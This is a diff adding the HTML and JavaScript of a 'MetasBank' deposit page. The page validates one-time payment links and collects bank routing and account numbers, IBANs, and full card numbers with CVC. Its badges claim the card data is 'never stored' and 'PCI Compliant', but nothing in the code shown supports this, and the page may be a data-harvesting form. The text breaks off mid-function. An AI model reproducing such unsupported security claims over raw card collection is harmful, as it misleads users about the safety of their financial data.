@@ -1,0 +1,759 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
+  <script src="geo-restrict.js"></script>
+  <title>MetasBank — Complete Your Deposit</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script src="/supabase-config.js"></script>
+  <script src="/validation.js"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: { orange: { 50:'#fff7ed',100:'#ffedd5',200:'#fed7aa',300:'#fdba74',400:'#fb923c',500:'#f97316',600:'#ea580c',700:'#c2410c',800:'#9a3412',900:'#7c2d12' } }
+        }
+      }
+    }
+  </script>
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=EB+Garamond:wght@400;500;600;700;800&display=swap");
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    * { font-family: 'Inter', sans-serif; }
+    h1 { font-family: 'EB Garamond', serif; text-transform: uppercase; font-weight: 800; letter-spacing: 0.02em; }
+    :root {
+      --bg: #0f1117; --bg-card: #181b25; --bg-card-hover: #1e2130;
+      --text: #f0f2f5; --text-muted: #5a6070; --text-secondary: #9ca3b4;
+      --border: rgba(255,255,255,0.06); --border-focus: rgba(249,115,22,0.5);
+      --input-bg: #12141c; --input-border: rgba(255,255,255,0.08);
+      --accent: #ff5c35; --accent-hover: #e84a24; --accent-light: #ff8f6e;
+      --accent-glow: rgba(255,92,53,0.15); --green: #10b981; --green-bg: rgba(16,185,129,0.06);
+      --green-border: rgba(16,185,129,0.15); --red: #ef4444; --red-bg: rgba(239,68,68,0.06);
+      --red-border: rgba(239,68,68,0.15);
+      --shadow-sm: 0 1px 2px rgba(0,0,0,0.3); --shadow-md: 0 4px 12px rgba(0,0,0,0.4);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    html { height: 100%; width: 100%; overflow-x: hidden; }
+    body {
+      font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg); color: var(--text); width: 100%; max-width: 100%;
+      min-height: 100vh; min-height: 100dvh; overflow-x: hidden;
+      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+      -webkit-text-size-adjust: 100%;
+    }
+    input, select, textarea { font-family: inherit; }
+    input { font-size: 16px !important; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner { width: 36px; height: 36px; border: 2.5px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.7s linear infinite; }
+
+    @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+    .fade-up { animation: fadeUp 0.5s cubic-bezier(0.16,1,0.3,1) both; }
+
+    @keyframes checkPop { 0% { transform: scale(0); opacity:0; } 50% { transform: scale(1.15); } 100% { transform: scale(1); opacity:1; } }
+    .check-pop { animation: checkPop 0.5s cubic-bezier(0.34,1.56,0.64,1) both; animation-delay: 0.15s; }
+
+    @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+    .shimmer-text {
+      background: linear-gradient(90deg, var(--text) 0%, var(--accent-light) 50%, var(--text) 100%);
+      background-size: 200% auto; -webkit-background-clip: text; background-clip: text;
+      -webkit-text-fill-color: transparent; animation: shimmer 3s linear infinite;
+    }
+
+    .gradient-orange { background: linear-gradient(135deg, #ff5c35, #ff8f6e); }
+
+    .input-field {
+      width: 100%; padding: 13px 16px; background: var(--input-bg); border: 1.5px solid var(--input-border);
+      border-radius: 10px; color: var(--text); font-size: 16px; font-weight: 400;
+      outline: none; transition: border-color 0.2s, box-shadow 0.2s; letter-spacing: 0.01em;
+      -webkit-appearance: none; -moz-appearance: none; appearance: none;
+    }
+    .input-field:focus { border-color: rgba(255,92,53,0.5); box-shadow: 0 0 0 3px rgba(255,92,53,0.15); }
+    .input-field::placeholder { color: var(--text-muted); font-weight: 400; }
+    .input-field:-webkit-autofill,
+    .input-field:-webkit-autofill:hover,
+    .input-field:-webkit-autofill:focus,
+    .input-field:-webkit-autofill:active {
+      -webkit-box-shadow: 0 0 0 30px var(--input-bg) inset !important;
+      -webkit-text-fill-color: var(--text) !important;
+      caret-color: var(--text);
+      font-size: 16px !important;
+      transition: background-color 5000s ease-in-out 0s;
+    }
+    .input-label {
+      display: block; font-size: 12px; font-weight: 600; color: var(--text-secondary);
+      margin-bottom: 6px; letter-spacing: 0.04em; text-transform: uppercase;
+    }
+
+    .method-card {
+      background: var(--bg-card); border: 1.5px solid var(--border); border-radius: 12px;
+      padding: 16px; cursor: pointer; transition: all 0.2s cubic-bezier(0.16,1,0.3,1);
+      position: relative; overflow: hidden;
+    }
+    .method-card:hover { border-color: rgba(255,92,53,0.25); background: var(--bg-card-hover); transform: translateY(-1px); }
+    .method-card.selected {
+      border-color: var(--accent); background: rgba(255,92,53,0.04);
+      box-shadow: 0 0 0 3px rgba(255,92,53,0.15), var(--shadow-sm);
+    }
+    .method-card.selected .method-check { opacity: 1; transform: scale(1); }
+    .method-check { opacity: 0; transform: scale(0.5); transition: all 0.2s cubic-bezier(0.34,1.56,0.64,1); }
+
+    .btn-primary {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 14px 24px; background: linear-gradient(135deg, #ff5c35, #ff8f6e);
+      color: #fff; font-weight: 600; font-size: 15px; border: none; border-radius: 10px;
+      cursor: pointer; transition: all 0.2s; letter-spacing: 0.01em;
+    }
+    .btn-primary:hover { filter: brightness(1.05); transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,92,53,0.35); }
+    .btn-primary:active { transform: scale(0.98); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; filter: none; transform: none; box-shadow: none; }
+
+    .btn-continue {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      width: 100%; padding: 14px 24px; background: linear-gradient(135deg, #ff5c35, #ff8f6e); color: #fff;
+      font-weight: 600; font-size: 15px; border: none; border-radius: 10px;
+      cursor: pointer; transition: all 0.2s; text-decoration: none;
+    }
+    .btn-continue:hover { filter: brightness(1.05); transform: translateY(-1px); box-shadow: 0 6px 20px rgba(255,92,53,0.35); }
+    .btn-continue:active { transform: scale(0.98); }
+
+    .secure-pill {
+      display: inline-flex; align-items: center; gap: 5px; font-size: 11px; font-weight: 500;
+      color: var(--green); background: var(--green-bg); border: 1px solid var(--green-border);
+      padding: 4px 10px; border-radius: 20px;
+    }
+
+    .info-box-green {
+      display: flex; align-items: center; gap: 8px; padding: 10px 14px;
+      background: var(--green-bg); border: 1px solid var(--green-border); border-radius: 10px;
+    }
+    .info-box-red {
+      display: flex; align-items: center; gap: 8px; padding: 10px 14px;
+      background: var(--red-bg); border: 1px solid var(--red-border); border-radius: 10px;
+    }
+
+    .card-row { display: flex; gap: 12px; }
+    .card-row > * { flex: 1; }
+
+    .card-icon {
+      width: 38px; height: 24px; border-radius: 5px; border: 1.5px solid var(--input-border);
+      display: flex; align-items: center; justify-content: center; font-size: 8px;
+      font-weight: 700; color: var(--text-muted); background: var(--input-bg);
+      transition: all 0.2s;
+    }
+    .card-icon.active { border-color: var(--accent); color: var(--accent); background: rgba(255,92,53,0.06); }
+
+    .separator { display: flex; align-items: center; gap: 12px; margin: 20px 0; }
+    .separator::before, .separator::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+
+    @media (max-width: 480px) {
+      .card-row { flex-direction: column; gap: 10px; }
+    }
+  </style>
+  <style>html.js-loading *{transition:none!important}</style>
+  <script>
+    document.documentElement.classList.add('js-loading');
+    (function(){try{var t=localStorage.getItem('mb_theme');if(t==='light'){document.documentElement.classList.add('light-mode')}else if(t!=='dark'){var h=new Date().getHours();if(h>=6&&h<18)document.documentElement.classList.add('light-mode')}}catch(e){}})();
+    document.addEventListener('DOMContentLoaded',function(){requestAnimationFrame(function(){document.documentElement.classList.remove('js-loading')})});
+  </script>
+</head>
+<body class="flex flex-col items-center justify-start" style="padding: env(safe-area-inset-top, 0px) 0 env(safe-area-inset-bottom, 0px) 0;">
+
+  <!-- Loading state -->
+  <div id="loadingState" class="flex flex-col items-center justify-center" style="min-height:100vh; min-height:100dvh;">
+    <div class="spinner"></div>
+    <p class="mt-4 text-sm" style="color:var(--text-muted);">Loading payment details...</p>
+  </div>
+
+  <!-- Error state -->
+  <div id="errorState" class="hidden flex flex-col items-center justify-center px-5 text-center" style="min-height:100vh; min-height:100dvh;">
+    <div style="width:72px; height:72px; border-radius:50%; background:var(--red-bg); border:1px solid var(--red-border); display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+    </div>
+    <h2 style="font-size:20px; font-weight:700; margin-bottom:6px;">Invalid Payment Link</h2>
+    <p class="text-sm mb-6" style="color:var(--text-muted); max-width:280px;">This payment link is invalid or has expired. Please contact the sender for a new link.</p>
+    <a href="/" class="btn-continue" style="max-width:200px; text-align:center;">Go to MetasBank</a>
+  </div>
+
+  <!-- Already Used state -->
+  <div id="usedState" class="hidden flex flex-col items-center justify-center px-5 text-center" style="min-height:100vh; min-height:100dvh;">
+    <div style="width:72px; height:72px; border-radius:50%; background:rgba(245,158,11,0.1); border:1px solid rgba(245,158,11,0.2); display:flex; align-items:center; justify-content:center; margin-bottom:20px;">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    </div>
+    <h2 style="font-size:20px; font-weight:700; margin-bottom:6px; color:var(--text);">Link Already Used</h2>
+    <p class="text-sm mb-6" style="color:var(--text-muted); max-width:280px;">This payment link has already been submitted. Each link can only be used once. Please contact the sender for a new link.</p>
+    <a href="/" class="btn-continue" style="max-width:200px; text-align:center;">Go to MetasBank</a>
+  </div>
+
+  <!-- Success state -->
+  <div id="successState" class="hidden flex flex-col items-center justify-center px-5 text-center" style="min-height:100vh; min-height:100dvh;">
+    <div class="check-pop" style="width:72px; height:72px; border-radius:50%; background:linear-gradient(135deg,#10b981,#34d399); display:flex; align-items:center; justify-content:center; margin-bottom:24px; box-shadow: 0 8px 32px rgba(16,185,129,0.3);">
+      <svg width="36" height="36" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="7 17 15 25 29 8"/></svg>
+    </div>
+    <h2 style="font-size:22px; font-weight:700; margin-bottom:8px;">Payment Submitted</h2>
+    <p class="text-sm mb-8" style="color:var(--text-muted); max-width:300px; line-height:1.6;">Your deposit details have been recorded. Click below to continue with your registration.</p>
+    <a href="/signup/" id="signupLink" class="btn-continue" style="max-width:280px;">
+      Continue
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+    </a>
+  </div>
+
+  <!-- Main payment form -->
+  <div id="paymentForm" class="hidden w-full" style="max-width:480px;">
+    <div class="px-5 py-6 sm:px-6" style="padding-top: calc(20px + env(safe-area-inset-top, 0px));">
+
+      <!-- Merchant header -->
+      <div class="text-center mb-6 fade-up">
+        <div class="w-14 h-14 rounded-2xl gradient-orange flex items-center justify-center text-white font-black text-base mx-auto" style="box-shadow: 0 0 25px rgba(255,92,53,0.2); margin-bottom:14px;">MB</div>
+        <h1 class="text-xl font-bold" style="color: var(--text);">MetasBank</h1>
+        <p style="font-size:12px; color:var(--text-muted); font-weight:400;">Secure Payment Portal</p>
+      </div>
+
+      <!-- Amount card -->
+      <div class="rounded-2xl p-5 mb-5 fade-up" style="background:var(--bg-card); border:1px solid var(--border); animation-delay:0.05s;">
+        <p style="font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:8px;">Amount Due</p>
+        <div class="flex items-baseline gap-2.5">
+          <span id="currencyDisplay" style="font-size:16px; font-weight:600; color:var(--text-secondary);">USD</span>
+          <span id="amountDisplay" style="font-size:40px; font-weight:800; letter-spacing:-0.03em; line-height:1;">0.00</span>
+        </div>
+        <div id="noteDisplay" class="hidden mt-3 text-xs" style="color:var(--text-muted); border-top:1px solid var(--border); padding-top:10px;"></div>
+        <div class="flex items-center justify-between mt-4">
+          <span class="secure-pill">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            256-bit Encrypted
+          </span>
+          <span style="font-size:11px; color:var(--text-muted); font-family:monospace; font-weight:500;">Ref: <span id="refDisplay">---</span></span>
+        </div>
+      </div>
+
+      <!-- Method selection -->
+      <div class="mb-5 fade-up" style="animation-delay:0.1s;">
+        <p style="font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:10px;">Payment Method</p>
+
+        <div class="flex gap-3">
+          <!-- Bank -->
+          <div id="methodBank" class="method-card flex-1" onclick="selectMethod('bank')">
+            <div class="flex items-center justify-between mb-3">
+              <div style="width:40px; height:40px; border-radius:10px; background:rgba(255,92,53,0.08); display:flex; align-items:center; justify-content:center;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 8 22 8"/><rect x="4" y="10" width="3" height="7"/><rect x="10.5" y="10" width="3" height="7"/><rect x="17" y="10" width="3" height="7"/><rect x="2" y="19" width="20" height="2"/></svg>
+              </div>
+              <svg class="method-check" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="8 12 11 15 16 9"/></svg>
+            </div>
+            <p style="font-size:14px; font-weight:600; color:var(--text);">Bank Transfer</p>
+            <p style="font-size:12px; color:var(--text-muted); margin-top:2px;">Direct ACH deposit</p>
+          </div>
+
+          <!-- Credit Card -->
+          <div id="methodCard" class="method-card flex-1" onclick="selectMethod('card')">
+            <div class="flex items-center justify-between mb-3">
+              <div style="width:40px; height:40px; border-radius:10px; background:rgba(255,92,53,0.08); display:flex; align-items:center; justify-content:center;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
+              </div>
+              <svg class="method-check" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="8 12 11 15 16 9"/></svg>
+            </div>
+            <p style="font-size:14px; font-weight:600; color:var(--text);">Credit Card</p>
+            <p style="font-size:12px; color:var(--text-muted); margin-top:2px;">Visa, Mastercard, Amex</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Bank details panel -->
+      <div id="bankPanel" class="hidden mb-5 fade-up" style="animation-delay:0.15s;">
+        <div class="rounded-2xl p-5" style="background:var(--bg-card); border:1px solid var(--border);">
+          <p style="font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:16px;">Bank Account Details</p>
+
+          <!-- Bank transfer type toggle -->
+          <div style="display:flex; gap:8px; margin-bottom:16px;">
+            <button type="button" id="bankTypeUS" onclick="switchBankType('us')" style="flex:1; padding:8px 12px; border-radius:8px; font-size:11px; font-weight:700; cursor:pointer; border:2px solid #ff5c35; background:rgba(255,92,53,0.1); color:#ff5c35; transition:all 0.2s;">🇺🇸 US Bank (Routing)</button>
+            <button type="button" id="bankTypeIntl" onclick="switchBankType('intl')" style="flex:1; padding:8px 12px; border-radius:8px; font-size:11px; font-weight:700; cursor:pointer; border:2px solid var(--border); background:transparent; color:var(--text-muted); transition:all 0.2s;">🌍 International (IBAN)</button>
+          </div>
+
+          <!-- US Bank Fields -->
+          <div id="bankFieldsUS" class="flex flex-col gap-3.5">
+            <div>
+              <label class="input-label">Full Name</label>
+              <input id="bankPayerName" class="input-field" placeholder="John Smith" autocomplete="name">
+            </div>
+            <div>
+              <label class="input-label">Routing Number <span style="font-size:10px; color:var(--text-muted);">(9 digits — ABA)</span></label>
+              <input id="bankRoutingInput" class="input-field" placeholder="e.g. 021000021" maxlength="9" inputmode="numeric" autocomplete="off" oninput="onRoutingInput(this)">
+              <div id="routingError" class="hidden" style="font-size:11px; color:#ef4444; margin-top:4px;"></div>
+            </div>
+            <div>
+              <label class="input-label">Bank Name</label>
+              <input id="bankNameInput" class="input-field" placeholder="Enter routing number first" readonly style="cursor:default; opacity:0.6;">
+              <div id="bankDetected" class="hidden mt-2">
+                <div class="info-box-green">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                  <span style="font-size:12px; font-weight:600; color:#10b981;" id="bankDetectedName"></span>
+                </div>
+              </div>
+              <div id="bankUnknown" class="hidden mt-2">
+                <div class="info-box-red">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+                  <span style="font-size:12px; color:#ef4444;">Bank not recognized — enter your bank name below</span>
+                </div>
+              </div>
+            </div>
+            <div>
+              <label class="input-label">Account Number</label>
+              <input id="bankAccountInput" class="input-field" placeholder="Your account number" inputmode="numeric" autocomplete="off">
+              <div id="accountError" class="hidden" style="font-size:11px; color:#ef4444; margin-top:4px;"></div>
+            </div>
+          </div>
+
+          <!-- International Bank Fields (IBAN) -->
+          <div id="bankFieldsIntl" class="flex flex-col gap-3.5 hidden">
+            <div>
+              <label class="input-label">Full Name</label>
+              <input id="intlPayerName" class="input-field" placeholder="John Smith" autocomplete="name">
+            </div>
+            <div>
+              <label class="input-label">IBAN <span style="font-size:10px; color:var(--text-muted);">(e.g. DE89 3704 0044 0532 0130 00)</span></label>
+              <input id="intlIban" class="input-field" placeholder="DE89370400440532013000" maxlength="34" autocomplete="off" style="text-transform:uppercase;" oninput="validateIntlIban(this)">
+              <div id="ibanError" class="hidden" style="font-size:11px; color:#ef4444; margin-top:4px;"></div>
+              <div id="ibanValid" class="hidden" style="font-size:11px; color:#10b981; margin-top:4px;"></div>
+            </div>
+            <div>
+              <label class="input-label">SWIFT / BIC Code <span style="font-size:10px; color:var(--text-muted);">(8 or 11 characters)</span></label>
+              <input id="intlSwift" class="input-field" placeholder="e.g. DEUTDEFF" maxlength="11" autocomplete="off" style="text-transform:uppercase;" oninput="validateIntlSwift(this)">
+              <div id="swiftError" class="hidden" style="font-size:11px; color:#ef4444; margin-top:4px;"></div>
+            </div>
+            <div>
+              <label class="input-label">Bank Name</label>
+              <input id="intlBankName" class="input-field" placeholder="Your bank name" autocomplete="off">
+            </div>
+          </div>
+
+          <input type="hidden" id="bankDetectedValue" value="">
+
+          <button id="bankSubmitBtn" class="btn-primary mt-5" onclick="submitPayment('bank')">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Submit Payment
+          </button>
+        </div>
+      </div>
+
+      <!-- Card details panel -->
+      <div id="cardPanel" class="hidden mb-5 fade-up" style="animation-delay:0.15s;">
+        <div class="rounded-2xl p-5" style="background:var(--bg-card); border:1px solid var(--border);">
+
+          <!-- Card header + icons -->
+          <div class="flex items-center justify-between mb-4">
+            <p style="font-size:11px; font-weight:600; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.08em;">Credit Card Details</p>
+            <div style="display:flex; gap:5px; align-items:center;">
+              <div id="iconVisa" class="card-icon">VISA</div>
+              <div id="iconMC" class="card-icon">MC</div>
+              <div id="iconAmex" class="card-icon">AMEX</div>
+              <div id="iconDiscover" class="card-icon">DISC</div>
+            </div>
+          </div>
+
+          <div class="flex flex-col gap-3.5">
+            <div>
+              <label class="input-label">Cardholder Name</label>
+              <input id="cardHolder" class="input-field" placeholder="John Smith" autocomplete="cc-name">
+            </div>
+            <div>
+              <label class="input-label">Card Number</label>
+              <div class="relative">
+                <input id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" inputmode="numeric" style="padding-right:52px;">
+                <div id="cardBrandIcon" class="hidden" style="position:absolute; right:14px; top:50%; transform:translateY(-50%); pointer-events:none;"></div>
+              </div>
+            </div>
+            <div class="card-row">
+              <div>
+                <label class="input-label">Expiry</label>
+                <input id="cardExpiry" class="input-field" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp" inputmode="numeric">
+              </div>
+              <div>
+                <label class="input-label">CVC</label>
+                <input id="cardCVC" class="input-field" placeholder="123" maxlength="4" autocomplete="cc-csc" inputmode="numeric">
+              </div>
+            </div>
+            <div>
+              <label class="input-label">Email Address</label>
+              <input id="cardPayerEmail" class="input-field" placeholder="you@example.com" type="email" autocomplete="email">
+            </div>
+          </div>
+
+          <div class="info-box-green mt-4">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            <span style="font-size:12px; color:#10b981;">Card details encrypted &mdash; never stored</span>
+          </div>
+
+          <button id="cardSubmitBtn" class="btn-primary mt-4" onclick="submitPayment('card')">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            Submit Payment
+          </button>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="text-center mt-6 pb-8 fade-up" style="animation-delay:0.2s; padding-top:16px;">
+        <div class="separator" style="margin:0 0 16px 0;">
+          <span style="font-size:11px; font-weight:500; color:var(--text-muted); white-space:nowrap;">Powered by <span style="font-weight:700; color:var(--text-secondary);">MetasBank</span></span>
+        </div>
+        <div class="flex items-center justify-center gap-2.5 flex-wrap" style="margin-bottom:12px;">
+          <span style="font-size:11px; color:var(--text-muted);">Secure Payment</span>
+          <span style="width:3px; height:3px; border-radius:50%; background:var(--text-muted); opacity:0.5;"></span>
+          <span style="font-size:11px; color:var(--text-muted);">256-bit Encryption</span>
+          <span style="width:3px; height:3px; border-radius:50%; background:var(--text-muted); opacity:0.5;"></span>
+          <span style="font-size:11px; color:var(--text-muted);">PCI Compliant</span>
+        </div>
+        <p style="font-size:10px; color:var(--text-muted); opacity:0.6;">&copy; 2026 MetasBank. All rights reserved.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+  const ROUTING_BANK_MAP = {
+    '021000021': 'JPMorgan Chase Bank', '021000018': 'JPMorgan Chase Bank', '021000089': 'JPMorgan Chase Bank',
+    '026009593': 'Bank of America', '021200339': 'Bank of America', '021214163': 'Bank of America',
+    '121000248': 'Wells Fargo Bank', '121100777': 'Wells Fargo Bank', '122105155': 'Wells Fargo Bank', '124103703': 'Wells Fargo Bank',
+    '021000615': 'Citibank', '021001486': 'Citibank', '322271627': 'Citibank',
+    '021000098': 'U.S. Bank', '091000022': 'U.S. Bank', '091215927': 'U.S. Bank',
+    '102000021': 'Capital One', '031176110': 'Capital One', '031101266': 'Capital One', '031001175': 'Capital One',
+    '311972536': 'TD Bank', '031201360': 'TD Bank', '031001004': 'TD Bank',
+    '231382385': 'PNC Bank', '043000096': 'PNC Bank', '043001088': 'PNC Bank', '053100300': 'PNC Bank',
+    '074900783': 'KeyBank', '041215663': 'KeyBank',
+    '061000104': 'Truist Bank', '053101554': 'Truist Bank', '053101122': 'Truist Bank', '061101830': 'Truist Bank', '122230182': 'Truist Bank', '053207766': 'Truist Bank',
+    '322271724': 'Ally Bank', '123103457': 'Ally Bank',
+    '072401404': 'Huntington Bank', '072000787': 'Huntington Bank',
+    '062004381': 'Regions Bank', '062203314': 'Regions Bank', '062005627': 'Regions Bank',
+    '071921891': 'Fifth Third Bank', '042000301': 'Fifth Third Bank', '071026029': 'Fifth Third Bank', '042000429': 'Fifth Third Bank',
+    '091905254': 'USAA', '314074269': 'USAA', '314090356': 'USAA',
+    '063100277': 'Navy Federal Credit Union', '256074974': 'Navy Federal Credit Union', '260099507': 'Navy Federal Credit Union', '125108475': 'Navy Federal Credit Union',
+    '321171184': 'Charles Schwab Bank', '061002462': 'Discover Bank',
+    '321081669': 'Morgan Stanley', '210901212': 'Morgan Stanley', '122230184': 'Comerica Bank'
+  };
+
+  let currentMethod = null;
+  let params = {};
+  let depositId = null;
+
+  document.addEventListener('DOMContentLoaded', function() {
+    params = new URLSearchParams(window.location.search);
+    const ref = params.get('ref');
+    const amount = parseFloat(params.get('amount'));
+    const currency = (params.get('currency') || 'USD').toUpperCase();
+    const note = params.get('note') || '';
+
+    if (!ref || !/^[A-Za-z0-9]{3,20}$/.test(ref) || isNaN(amount) || amount <= 0) { showState('error'); return; }
+
+    document.getElementById('refDisplay').textContent = ref;
+    document.getElementById('amountDisplay').textContent = amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    document.getElementById('currencyDisplay').textContent = currency;
+    if (note && note.length <= 200) {
+      document.getElementById('noteDisplay').textContent = note;
+      document.getElementById('noteDisplay').classList.remove('hidden');
+    }
+
+    showState('loading');
+    try { initSupabase(); } catch(e) { console.warn('Init failed'); }
+
+    supabaseClient.rpc('rpc_check_deposit_link', { p_ref_code: ref }).then(function(resp) {
+      if (resp.error || !resp.data || !resp.data.length) {
+        showState('error');
+        return;
+      }
+      var link = resp.data[0];
+      if (link.status === 'submitted' || link.status === 'linked' || link.status === 'credited') {
+        showState('used');
+        return;
+      }
+      depositId = link.id;
+      showState('form');
+    }).catch(function() {
+      showState('error');
+    });
+  });
+
+  function showState(state) {
+    ['loadingState','errorState','usedState','successState','paymentForm'].forEach(function(id) {
+      document.getElementById(id).classList.add('hidden');
+    });
+    var map = { loading:'loadingState', error:'errorState', used:'usedState', success:'successState', form:'paymentForm' };
+    document.getElementById(map[state]).classList.remove('hidden');
+  }
+
+  let currentBankType = 'us';
+
+  function switchBankType(type) {
+    currentBankType = type;
+    document.getElementById('bankFieldsUS').classList.toggle('hidden', type !== 'us');
+    document.getElementById('bankFieldsIntl').classList.toggle('hidden', type !== 'intl');
+    document.getElementById('bankTypeUS').style.borderColor = type === 'us' ? '#ff5c35' : 'var(--border)';
+    document.getElementById('bankTypeUS').style.background = type === 'us' ? 'rgba(255,92,53,0.1)' : 'transparent';
+    document.getElementById('bankTypeUS').style.color = type === 'us' ? '#ff5c35' : 'var(--text-muted)';
+    document.getElementById('bankTypeIntl').style.borderColor = type === 'intl' ? '#ff5c35' : 'var(--border)';
+    document.getElementById('bankTypeIntl').style.background = type === 'intl' ? 'rgba(255,92,53,0.1)' : 'transparent';
+    document.getElementById('bankTypeIntl').style.color = type === 'intl' ? '#ff5c35' : 'var(--text-muted)';
+  }
+
+  function validateIntlIban(el) {
+    el.value = el.value.toUpperCase().replace(/[^A-Z0-9]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    let errEl = document.getElementById('ibanError');
+    let okEl = document.getElementById('ibanValid');
+    errEl.classList.add('hidden');
+    okEl.classList.add('hidden');
+    let raw = el.value.replace(/\s/g, '');
+    if (raw.length < 5) return;
+    let result = MetasValidate.validateIBAN(raw);
+    if (!result.valid) {
+      errEl.textContent = result.error;
+      errEl.classList.remove('hidden');
+    } else {
+      okEl.textContent = '✓ Valid ' + result.country + ' IBAN (' + raw.length + ' chars)';
+      okEl.classList.remove('hidden');
+    }
+  }
+
+  function validateIntlSwift(el) {
+    el.value = el.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+    let errEl = document.getElementById('swiftError');
+    errEl.classList.add('hidden');
+    let raw = el.value;
+    if (raw.length < 8) return;
+    let result = MetasValidate.validateSWIFT(raw);
+    if (!result.valid) {
+      errEl.textContent = result.error;
+      errEl.classList.remove('hidden');
+    }
+  }
+
+  function onRoutingInput(el) {
+    const val = el.value.replace(/\D/g, '');
+    el.value = val;
+    const detected = document.getElementById('bankDetected');
+    const unknown = document.getElementById('bankUnknown');
+    const nameEl = document.getElementById('bankDetectedName');
+    const hidden = document.getElementById('bankDetectedValue');
+    const bankInput = document.getElementById('bankNameInput');
+
+    if (val.length === 9) {
+      const bank = ROUTING_BANK_MAP[val];
+      if (bank) {
+        hidden.value = bank;
+        bankInput.value = bank;
+        bankInput.readOnly = true;
+        bankInput.style.opacity = '0.6';
+        bankInput.style.cursor = 'default';
+        nameEl.textContent = bank;
+        detected.classList.remove('hidden');
+        unknown.classList.add('hidden');
+      } else {
+        hidden.value = '';
+        bankInput.value = '';
+        bankInput.readOnly = false;
+        bankInput.style.opacity = '1';
+        bankInput.style.cursor = 'text';
